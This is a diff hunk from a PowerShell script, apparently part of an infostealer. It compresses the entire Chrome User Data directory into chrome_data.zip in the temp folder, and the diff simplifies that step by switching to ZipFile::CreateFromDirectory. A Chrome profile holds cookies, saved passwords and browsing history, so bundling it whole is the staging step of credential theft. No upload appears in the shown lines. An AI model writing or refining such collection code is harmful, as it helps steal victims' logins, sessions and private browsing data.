@@ -95,25 +95,14 @@ if (-not (Test-Path $chromePath)) {
     exit
 }
 
+# Load the necessary assembly for .NET compression
+Add-Type -AssemblyName "System.IO.Compression.FileSystem"
+
 # Create a zip of the Chrome User Data using .NET compression (alternative method)
 $outputZip = "$env:TEMP\chrome_data.zip"
 try {
     # Create a new zip file
-    $zipFile = [System.IO.Compression.ZipFile]::Open($outputZip, [System.IO.Compression.ZipArchiveMode]::Create)
-
-    # Recursively add files from Chrome User Data directory to the zip
-    Get-ChildItem -Path $chromePath -Recurse | ForEach-Object {
-        $file = $_
-        if ($file.PSIsContainer) {
-            # If it's a directory, create the directory in the zip
-            $zipFile.CreateEntryDirectory($file.FullName.Substring($chromePath.Length + 1))
-        } else {
-            # If it's a file, add it to the zip
-            $zipFile.CreateEntryFromFile($file.FullName, $file.FullName.Substring($chromePath.Length + 1))
-        }
-    }
-
-    $zipFile.Dispose()
+    [System.IO.Compression.ZipFile]::CreateFromDirectory($chromePath, $outputZip)
 
     Write-Host "Compression successful, file saved at: $outputZip"
 } catch {
